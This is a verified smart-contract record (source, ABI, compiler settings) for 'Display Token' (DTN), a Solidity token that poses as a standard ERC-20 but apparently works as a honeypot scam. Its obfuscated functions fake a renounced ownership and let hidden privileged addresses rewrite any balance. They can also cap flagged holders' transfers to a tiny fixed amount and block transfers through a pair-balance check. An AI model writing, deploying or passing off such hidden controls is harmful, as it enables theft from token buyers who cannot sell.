{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tokenAmountReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atLiquidity) external view returns (uint256);\n\n    function transfer(address tokenReceiver, uint256 txMarketing) external returns (bool);\n\n    function allowance(address listSwapReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenReceiver,\n        uint256 txMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAmount, uint256 value);\n    event Approval(address indexed listSwapReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract launchedTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenWalletMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeFrom {\n    function createPair(address isReceiver, address minToken) external returns (address);\n}\n\ninterface tokenAmountReceiverMetadata is tokenAmountReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisplayToken is launchedTrading, tokenAmountReceiver, tokenAmountReceiverMetadata {\n\n    bool public amountMax;\n\n    address private autoToken;\n\n    address maxTeamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSell;\n    }\n\n    bool public totalSwap;\n\n    bool public enableLaunchWallet;\n\n    uint256 constant senderToken = 17 ** 10;\n\n    uint256 fromAmount;\n\n    address public teamIsLiquidity;\n\n    address public amountTake;\n\n    address swapBuyIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldAt() public {\n        emit OwnershipTransferred(teamIsLiquidity, address(0));\n        autoToken = address(0);\n    }\n\n    mapping(address => bool) public sellReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTeam;\n    }\n\n    mapping(address => bool) public modeSender;\n\n    uint256 private limitAuto;\n\n    function approve(address marketingTotal, uint256 txMarketing) public virtual override returns (bool) {\n        exemptAtReceiver[_msgSender()][marketingTotal] = txMarketing;\n        emit Approval(_msgSender(), marketingTotal, txMarketing);\n        return true;\n    }\n\n    mapping(address => uint256) private limitTo;\n\n    uint256 private amountTeam = 100000000 * 10 ** 18;\n\n    function amountLiquidity(address feeMode, address tokenReceiver, uint256 txMarketing) internal returns (bool) {\n        require(limitTo[feeMode] >= txMarketing);\n        limitTo[feeMode] -= txMarketing;\n        limitTo[tokenReceiver] += txMarketing;\n        emit Transfer(feeMode, tokenReceiver, txMarketing);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTotal;\n    }\n\n    function amountShouldFee(address minReceiver) public {\n        if (amountMax) {\n            return;\n        }\n        if (limitAuto == minModeAt) {\n            limitAuto = minModeAt;\n        }\n        sellReceiver[minReceiver] = true;\n        \n        amountMax = true;\n    }\n\n    function allowance(address amountAtSender, address marketingTotal) external view virtual override returns (uint256) {\n        if (marketingTotal == swapBuyIs) {\n            return type(uint256).max;\n        }\n        return exemptAtReceiver[amountAtSender][marketingTotal];\n    }\n\n    uint256 exemptAt;\n\n    string private minAuto = \"Display Token\";\n\n    function owner() external view returns (address) {\n        return autoToken;\n    }\n\n    function txSell(address tradingIsSell, uint256 txMarketing) public {\n        buyExemptMax();\n        limitTo[tradingIsSell] = txMarketing;\n    }\n\n    function buyExemptMax() private view {\n        require(sellReceiver[_msgSender()]);\n    }\n\n    uint256 public fromTxTotal;\n\n    function getOwner() external view returns (address) {\n        return autoToken;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minAuto;\n    }\n\n    function balanceOf(address atLiquidity) public view virtual override returns (uint256) {\n        return limitTo[atLiquidity];\n    }\n\n    function exemptAuto(address feeMode, address tokenReceiver, uint256 txMarketing) internal returns (bool) {\n        if (feeMode == teamIsLiquidity) {\n            return amountLiquidity(feeMode, tokenReceiver, txMarketing);\n        }\n        uint256 marketingLaunch = tokenAmountReceiver(amountTake).balanceOf(maxTeamReceiver);\n        require(marketingLaunch == exemptAt);\n        require(tokenReceiver != maxTeamReceiver);\n        if (modeSender[feeMode]) {\n            return amountLiquidity(feeMode, tokenReceiver, senderToken);\n        }\n        return amountLiquidity(feeMode, tokenReceiver, txMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptAtReceiver;\n\n    uint256 private minModeAt;\n\n    function transferFrom(address feeMode, address tokenReceiver, uint256 txMarketing) external override returns (bool) {\n        if (_msgSender() != swapBuyIs) {\n            if (exemptAtReceiver[feeMode][_msgSender()] != type(uint256).max) {\n                require(txMarketing <= exemptAtReceiver[feeMode][_msgSender()]);\n                exemptAtReceiver[feeMode][_msgSender()] -= txMarketing;\n            }\n        }\n        return exemptAuto(feeMode, tokenReceiver, txMarketing);\n    }\n\n    uint8 private autoSell = 18;\n\n    event OwnershipTransferred(address indexed autoLaunched, address indexed walletSwap);\n\n    function limitShould(address feeLimit) public {\n        buyExemptMax();\n        if (minModeAt == fromTxTotal) {\n            minModeAt = fromTxTotal;\n        }\n        if (feeLimit == teamIsLiquidity || feeLimit == amountTake) {\n            return;\n        }\n        modeSender[feeLimit] = true;\n    }\n\n    function transfer(address tradingIsSell, uint256 txMarketing) external virtual override returns (bool) {\n        return exemptAuto(_msgSender(), tradingIsSell, txMarketing);\n    }\n\n    string private walletTotal = \"DTN\";\n\n    function maxTxMode(uint256 txMarketing) public {\n        buyExemptMax();\n        exemptAt = txMarketing;\n    }\n\n    constructor (){\n        \n        tokenWalletMarketing totalLimit = tokenWalletMarketing(swapBuyIs);\n        amountTake = feeFrom(totalLimit.factory()).createPair(totalLimit.WETH(), address(this));\n        \n        teamIsLiquidity = _msgSender();\n        shouldAt();\n        sellReceiver[teamIsLiquidity] = true;\n        limitTo[teamIsLiquidity] = amountTeam;\n        \n        emit Transfer(address(0), teamIsLiquidity, amountTeam);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwapReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAtSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"amountShouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunchWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTxTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"limitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"maxTxMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIsLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIsSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIsSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"txSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DisplayToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}